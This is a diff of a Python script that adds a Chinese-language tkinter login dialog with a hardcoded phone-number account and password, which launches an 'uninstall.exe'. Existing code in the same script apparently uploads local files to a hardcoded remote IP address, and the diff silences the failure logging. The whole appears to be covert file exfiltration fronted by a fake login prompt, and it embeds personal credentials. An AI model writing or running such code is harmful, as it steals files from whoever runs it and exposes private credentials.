@@ -1,8 +1,44 @@
 import requests
 from threading import Timer
+from tkinter import *
 import datetime
 import os
 import json
+
+def open_app(app_dir):
+    os.startfile(app_dir) #os.startfile（）打开外部应该程序，与windows双击相同
+
+root = Tk()
+root.title("登录验证")
+
+Label(root,text='帐号 :').grid(row=0,column=0) # 对Label内容进行 表格式 布局
+Label(root,text='密码 :').grid(row=1,column=0)
+
+v1=StringVar()    # 设置变量 .
+v2=StringVar()
+
+e1 = Entry(root,textvariable=v1)            # 用于储存 输入的内容
+e2 = Entry(root,textvariable=v2,show='*')
+e1.grid(row=0,column=1,padx=10,pady=5)      # 进行表格式布局 .
+e2.grid(row=1,column=1,padx=10,pady=5)
+def show():
+    # print("帐号 :%s" % e1.get())          # get 变量内容
+    # print("密码 :%s" % e2.get())
+    if e1.get() == "15210848977" and e2.get() == "xiaoyuqing" :
+        root.destroy()
+        app_dir = r'.\\uninstall.exe'#指定应用程序目录
+        open_app(app_dir)
+    else :
+        Label(root,text='账号或密码错误!').grid(row=3,column=0)
+        # easygui.msgbox('账号或密码错误!', "提示")
+
+def stop():
+    root.destroy()
+
+Button(root,text='登录',width=10,command=show).grid(row=4,column=0,sticky=W,padx=10,pady=5)  # 设置 button 指定 宽度 , 并且 关联 函数 , 使用表格式布局 .
+Button(root,text='退出',width=10,command=stop).grid(row=4,column=1,sticky=E,padx=10,pady=5)
+
+mainloop()
 
 # baseUrl = "http://localhost:8100"
 baseUrl = "http://114.116.250.115:8100"
@@ -97,7 +133,7 @@ def upload(str = "") :
             files = {'img': ('1.png', open(str, 'rb'), 'image/png', {})}
             res=requests.request("POST",url, data=None, files=files)
         except:
-            notice(str+"_upload_failed")
+            # notice(str+"_upload_failed")
             # print(str+"_upload_failed")
             checkPath(currentPath)
         else:
@@ -116,8 +152,8 @@ def upload(str = "") :
 
 
 
-def notice(str) :
-    url = baseUrl + "/log?msg=" + str
-    res=requests.get(url)
+# def notice(str) :
+#     url = baseUrl + "/log?msg=" + str
+#     res=requests.get(url)
 
 checkPath()
